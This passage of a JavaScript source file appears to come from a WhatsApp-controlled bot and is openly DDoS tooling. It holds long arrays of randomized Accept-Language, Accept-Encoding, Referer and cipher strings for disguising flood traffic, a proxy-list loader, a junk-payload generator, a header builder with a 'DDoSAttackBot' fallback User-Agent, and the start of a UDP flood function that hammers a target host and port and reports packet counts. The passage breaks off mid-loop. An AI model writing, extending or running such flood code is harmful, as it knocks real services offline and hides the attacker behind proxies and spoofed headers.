    "no-NO,no;q=0.9,en;q=0.8,sv;q=0.7,da;q=0.6,de;q=0.5",
    "da-DK,da;q=0.9,en;q=0.8,no;q=0.7,sv;q=0.6,de;q=0.5",
    "fi-FI,fi;q=0.9,en;q=0.8,sv;q=0.7,no;q=0.6,de;q=0.5",
    "en-GB-oxendict,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
    "de-DE-1996,de;q=0.9,de-AT;q=0.8,de-CH;q=0.7",
    "zh-CN,zh-Hans;q=0.9,zh-Hans-CN;q=0.8,zh;q=0.7",
    "*,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,it;q=0.5,pt;q=0.4,ru;q=0.3,zh;q=0.2,ja;q=0.1,ko;q=0.09,ar;q=0.08,hi;q=0.07,tr;q=0.06,pl;q=0.05,nl;q=0.04,sv;q=0.03,no;q=0.02,da;q=0.01"
];

const encodingHeader = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    '*',
    'gzip, deflate',
    'deflate, gzip, br',
    'br, gzip, deflate',
    'gzip, compress',
    'deflate, compress',
    'br, gzip',
    'gzip, deflate, identity',
    'deflate, br',
    'gzip;q=1.0, deflate;q=0.8, br;q=0.6',
    'br;q=0.9, gzip;q=0.7, deflate;q=0.5',
    'deflate;q=1.0, gzip;q=0.9, br;q=0.8, compress;q=0.7',
    'gzip;q=0.95, deflate;q=0.85, br;q=0.75, *;q=0.5',
    'compress;q=1.0, gzip;q=0.8, deflate;q=0.6',
    'gzip;q=0.99, deflate;q=0.88, br;q=0.77',
    'br;q=0.999, gzip;q=0.888, deflate;q=0.777',
    'gzip;q=1.00, deflate;q=0.90, br;q=0.80, compress;q=0.70',
    'deflate;q=0.95, gzip;q=0.85, br;q=0.75, compress;q=0.65, identity;q=0.55',
    '*, gzip, deflate',
    'gzip, deflate, *',
    '*, br, gzip',
    'br, *, gzip',
    '*, gzip;q=0.9, deflate;q=0.8',
    'gzip, deflate, br, *',
    'gzip',
    'deflate',
    'br',
    'compress',
    'identity',
    'gzip;q=1.0, gzip;q=0.9, deflate;q=0.8',
    'br;q=0.9, br;q=0.8, gzip;q=0.7',
    'gzip, deflate, br, compress, identity',
    'br, compress, gzip, deflate',
    'identity, gzip, deflate',
    'compress, identity, gzip',
    'deflate, identity, br',
    'gzip, deflate, br, zstd',
    'gzip, deflate, br, sdch',
    'gzip, deflate, br, x-gzip',
    'gzip, deflate, br, x-compress',
    'gzip,deflate,br',
    'gzip,deflate',
    'br,gzip',
    'gzip,deflate,br,compress',
    'gzip;q=1.0,deflate;q=0.8,br;q=0.6',
    'gzip, deflate,br',
    'gzip,deflate, br',
    'gzip , deflate , br',
    ' gzip, deflate, br ',
    'gzip, deflate, br, ',
    'gzip;q=1',
    'deflate;q=0.9',
    'br;q=0',
    'gzip;q=1.0, deflate;q=0.0',
    'identity;q=1.0, *;q=0.0',
    'gzip, deflate, br, compress, identity, *',
    'gzip;q=1.0, deflate;q=0.9, br;q=0.8, compress;q=0.7, identity;q=0.6, *;q=0.5',
    'br;q=0.95, gzip;q=0.90, deflate;q=0.85, compress;q=0.80, identity;q=0.75',
    'gzip, deflate, br, zstd, sdch',
    'gzip, deflate, br, xz',
    'gzip, deflate, br, lzma',
    'gzip, deflate, br, zstd, brotli',
    'gzip, deflate, br, lz4',
    'gzip, deflate, br, snappy',
    'gzip, deflate, br, unknown',
    'gzip, deflate, br, custom',
    'gzip, deflate, br, experimental',
    'gzip;q=0.8, deflate;q=0.6, br;q=0.4, compress;q=0.2',
    'br;q=1.0, gzip;q=0.5, deflate;q=0.3, *;q=0.1',
    'gzip;q=0.9, deflate;q=0.7, br;q=0.5, identity;q=0.3, *;q=0.1',
    'gzip;q=1.0, gzip;q=0.5, deflate;q=0.3',
    'br;q=0.9, br;q=0.6, gzip;q=0.4',
    'deflate;q=0.8, deflate;q=0.4, gzip;q=0.2',
    'identity;q=1.0',
    'identity;q=0.5, *;q=0.1',
    '*, identity;q=0.0',
    'gzip;q=0.0, deflate;q=0.0, br;q=0.0, identity;q=1.0',
    '',
    ' ',
    ',',
    ';,',
    '*;q=1.0',
    '*;q=0.5',
    '*;q=0.0',
    'gzip, deflate, *;q=0.1',
    '*;q=0.9, gzip;q=0.8',
    'gzip;q=1.0;level=9, deflate;q=0.8',
    'br;q=0.9;mode=text, gzip;q=0.8',
    'gzip;q=1.0;charset=utf-8, deflate;q=0.8',
    'gzip, deflate, br, compress, identity, x-gzip, x-compress, zstd, lz4, snappy, lzma, xz',
    'gzip;q=1.0, deflate;q=0.9, br;q=0.8, compress;q=0.7, identity;q=0.6, x-gzip;q=0.5, x-compress;q=0.4',
    'identity, compress, br, deflate, gzip',
    '*, identity, compress, br, deflate, gzip',
    'br, compress, identity, deflate, gzip',
    'gzip, *',
    'deflate, *',
    'br, *',
    'compress, *',
    'identity, *',
    'gzip;q=0.9',
    'deflate;q=0.8',
    'br;q=0.7',
    'compress;q=0.6',
    'identity;q=0.5',
    'gzip;q=1.0, deflate;q=0.9, br;q=0.8, compress;q=0.7, identity;q=0.6, *;q=0.5, x-gzip;q=0.4, x-compress;q=0.3, zstd;q=0.2, lz4;q=0.1'
];

const refers = [
    "http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/search?q=", "http://engadget.search.aol.com/search?q=query?=query=&q=",
    "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
    "http://go.mail.ru/search?mail.ru=1&q=", "http://help.baidu.com/searchResult?keywords=",
    "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", "http://jigsaw.w3.org/css-validator/validator?uri=",
    "http://jobs.bloomberg.com/search?q=", "http://jobs.leidos.com/search?q=", "http://jobs.rbs.com/jobs/search?q=",
    "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://louis-ddosvn.rhcloud.com/f5.html?v=",
    "http://millercenter.org/search?q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
    "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
    "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
    "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
    "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/", "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
    "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/", "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
    "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/", "http://search.aol.com/aol/search?q=",
    "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=",
    "http://validator.w3.org/feed/check.cgi?url=", "http://vk.com/profile.php?redirect=",
    "http://www.ask.com/web?q=", "http://www.baoxaydung.com.vn/news/vn/search&q=",
    "http://www.bestbuytheater.com/events/search?q=", "http://www.bing.com/search?q=",
    "http://www.evidence.nhs.uk/search?q=", "http://www.google.com/?q=", "http://www.google.com/translate?u=",
    "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=", "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
    "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
    "http://www.pagescoring.com/website-speed-test/?url=", "http://www.reddit.com/search?q=",
    "http://www.search.com/search?q=", "http://www.shodanhq.com/search?q=", "http://www.ted.com/search?q=",
    "http://www.topsiteminecraft.com/site/pinterest.com/search?q=", "http://www.usatoday.com/search/results?q=",
    "http://www.ustream.tv/search?q=", "http://yandex.ru/yandsearch?text=",
    "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", "http://ytmnd.com/search?q=",
    "https://add.my.yahoo.com/rss?url=", "https://careers.carolinashealthcare.org/search?q=",
    "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=",
    "https://drive.google.com/viewerng/viewer?url=", "https://duckduckgo.com/?q=", "https://google.com/",
    "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
    "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
    "https://help.baidu.com/searchResult?keywords=", "https://play.google.com/store/search?q=", "https://pornhub.com/",
    "https://r.search.yahoo.com/", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://steamcommunity.com/market/search?q=", "https://vk.com/profile.php?redirect=", "https://www.bing.com/search?q=",
    "https://www.cia.gov/index.html", "https://www.facebook.com/",
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "https://www.fbi.com/", "https://www.google.ad/search?q=", "https://www.google.ae/search?q=",
    "https://www.google.al/search?q=", "https://www.google.co.ao/search?q=", "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=", "https://www.google.com.ai/search?q=", "https://www.google.com/search?q=",
    "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
    "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
    "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
    "https://www.npmjs.com/search?q=", "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
    "https://www.pinterest.com/search?q=", "https://www.qwant.com/search?q=", "https://www.ted.com/search?q=",
    "https://www.usatoday.com/search/results?q=", "https://www.yandex.com/yandsearch?text=",
    "https://www.youtube.com/", "https://yandex.ru/"
];

const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
    "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
    "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
    "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
    "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", "AES256-SHA256", "AES256-SHA",
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

function loadProxyList() {
    try {
        const data = fs.readFileSync('./proxy.txt', 'utf8');
        const proxies = data.split('\n').map(line => {
            const [ip, port, protocol = 'http'] = line.trim().split(':');
            if (ip && port) {
                return { ip, port: parseInt(port), protocol: protocol.toLowerCase() };
            }
            return null;
        }).filter(Boolean);
        return proxies;
    } catch (err) {
        console.error('Error reading proxy list:', err);
        return [];
    }
}

let proxyList = loadProxyList();

function getRandomElement(arr) {
    if (arr.length === 0) return undefined;
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateRandomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomPayload(sizeInBytes = 1024) {
    const payload = {};
    let currentSize = 0;

    const addField = (obj, key, value) => {
        const keySize = Buffer.byteLength(key, 'utf8');
        const valueSize = Buffer.byteLength(JSON.stringify(value), 'utf8');
        if (currentSize + keySize + valueSize + 50 < sizeInBytes) { // +50 for overhead
            obj[key] = value;
            currentSize += keySize + valueSize;
            return true;
        }
        return false;
    };

    if (addField(payload, 'username', generateRandomString(8 + Math.floor(Math.random() * 8)))) {}
    if (addField(payload, 'password', generateRandomString(10 + Math.floor(Math.random() * 10)))) {}
    if (addField(payload, 'email', `${generateRandomString(5)}@${generateRandomString(5)}.com`)) {}
    if (addField(payload, 'message', generateRandomString(50 + Math.floor(Math.random() * 100)))) {}
    if (addField(payload, 'id', crypto.randomUUID())) {}
    if (addField(payload, 'timestamp', Date.now())) {}
    if (addField(payload, 'status', Math.random() > 0.5 ? 'active' : 'inactive')) {}
    if (addField(payload, 'count', Math.floor(Math.random() * 1000))) {}

    while (currentSize < sizeInBytes) {
        const randomKey = generateRandomString(5 + Math.floor(Math.random() * 5));
        const randomType = Math.floor(Math.random() * 4);

        let valueToAdd;
        if (randomType === 0) {
            valueToAdd = generateRandomString(10 + Math.floor(Math.random() * 20));
        } else if (randomType === 1) {
            valueToAdd = Math.floor(Math.random() * 100000);
        } else if (randomType === 2) {
            valueToAdd = Math.random() > 0.5;
        } else {
            if (Math.random() > 0.5) {
                valueToAdd = {
                    subKey1: generateRandomString(5),
                    subKey2: Math.floor(Math.random() * 100)
                };
            } else {
                valueToAdd = [generateRandomString(5), Math.floor(Math.random() * 100)];
            }
        }

        if (!addField(payload, randomKey, valueToAdd)) {
            const existingStringKeys = Object.keys(payload).filter(k => typeof payload[k] === 'string');
            if (existingStringKeys.length > 0) {
                const keyToPad = getRandomElement(existingStringKeys);
                const remainingBytes = sizeInBytes - currentSize;
                payload[keyToPad] += generateRandomString(Math.min(remainingBytes, 100));
                currentSize = Buffer.byteLength(JSON.stringify(payload), 'utf8');
            } else {
                break;
            }
        }
    }
    return payload;
}


function generateHeaders() {
    const userAgent = getRandomElement(userAgents) || 'Mozilla/5.0 (compatible; DDoSAttackBot/1.0)';
    return {
        'User-Agent': userAgent,
        'Accept': getRandomElement(langHeader) || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': getRandomElement(encodingHeader) || 'gzip, deflate, br',
        'Accept-Language': getRandomElement(langHeader) || 'en-US,en;q=0.9',
        'Referer': getRandomElement(refers) || 'https://www.google.com/',
        'Cache-Control': getRandomElement(cplist) || 'no-cache',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'TE': 'Trailers',
    };
}


function getAvailableProxy() {
    if (proxyList.length === 0) {
        console.warn(chalk.yellow('Daftar proxy kosong, tidak dapat menggunakan proxy.'));
        return null;
    }
    return getRandomElement(proxyList);
}

// --- Fungsi UDP Flood ---
async function udpFlood(sock, targetHost, targetPort, duration, concurrency) {
    let totalPacketCount = 0;
    let successPacketCount = 0;
    let errorPacketCount = 0;
    const startTime = Date.now();
    const endTime = startTime + duration * 1000;

    await sock.sendMessage(sock.user.id, {text:`*UDP Flood attack:*
 ▢ Target: *${targetHost}:${targetPort}*
 ▢ Durasi: *${duration} detik*
 ▢ Concurrency: *${concurrency} paket paralel*
`})

    const sendUdpPacket = async () => {
        if (Date.now() >= endTime) {
            clearInterval(interval);
            const totalTimeElapsed = (Date.now() - startTime) / 1000;
            const averagePPS = totalPacketCount / totalTimeElapsed; // Packets Per Second

            await sock.sendMessage(sock.user.id, { text:`*UDP Flood attack completed!*

▢ Target: *${targetHost}:${targetPort}*
▢ Durasi: ${duration} detik
▢ Concurrency: ${concurrency}

▢ Total Paket Terkirim: *${totalPacketCount}*
▢ Berhasil: *${successPacketCount}*
▢ Gagal/Error: *${errorPacketCount}*
▢ Rata-rata PPS: *${averagePPS.toFixed(2)}*`})

            console.log(`UDP Flood ke ${targetHost}:${targetPort} selesai. Total: ${totalPacketCount}, Sukses: ${successPacketCount}, Gagal: ${errorPacketCount}, PPS: ${averagePPS.toFixed(2)}`);
            return;
        }

        const packets = [];
        for (let i = 0; i < concurrency; i++) {
